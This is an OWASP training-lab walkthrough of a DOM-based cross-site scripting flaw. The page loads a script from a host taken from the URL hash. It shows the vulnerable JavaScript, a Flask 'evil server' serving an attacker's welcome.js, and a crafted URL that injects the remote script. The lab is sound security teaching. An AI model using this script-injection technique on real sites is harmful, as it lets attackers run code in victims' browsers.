# Cross Site Scripting \(DOM-2\)

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:java-xss-dom2
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-xss-dom2
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

#### Step 1

The application shows no input field or anything else we can interact with. Let's inspect the source code.

![](../../.gitbook/assets/nodejs/XSS-DOM-2/4.png)

Inspecting the source code of the application.

![](../../.gitbook/assets/nodejs/XSS-DOM-2/5.png)

```javascript
function loadWelcomeMessage() {
  setTimeout(function () {
    endpoint = location.hash.slice(5);
    var script = document.createElement("script");
    if (endpoint) {
      script.src = endpoint + "/js/welcome.js";
    } else {
      script.src = "/js/welcome.js";
    }
    document.head.appendChild(script);
  }, 2000);
}
```

We notice the application imports javascript files into the application using this function.

```javascript
endpoint = location.hash.slice(5);
```

Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.

![](../../.gitbook/assets/nodejs/XSS-DOM-2/1.png)

## Exploitation

We can start building our malicious server and server the application with our malicious js file.

```python
from flask import Flask

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

@app.route("/<path:path>")
def static_file(path):
    return app.send_static_file(path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)

```

Save the snippet above to &gt; evil_server.py and run the commands below to install some dependencies.
Of course you can also run your app on whatever service you want it does not have to be python flask.

```text
$ pip3 install flask
```

Now we need to create our malicous js file, save the following snippet code into /static/js/welcome.js

```javascript
document.getElementsByClassName("panel-body")[0].innerText = "XSS-DOM-2";
```

We are ready to start our server:

```text
$ python3 evil_server.py
```

![](../../.gitbook/assets/nodejs/XSS-DOM-2/2.png)

Now we can serve our malicious js file to the application

```text
http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
```

![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)

## Additional sources

Please refer to the OWASP testing guide for a full complete description about cross site scripting!

{% embed url="https://owasp.org/www-community/attacks/XSS-DOM-2/" %}
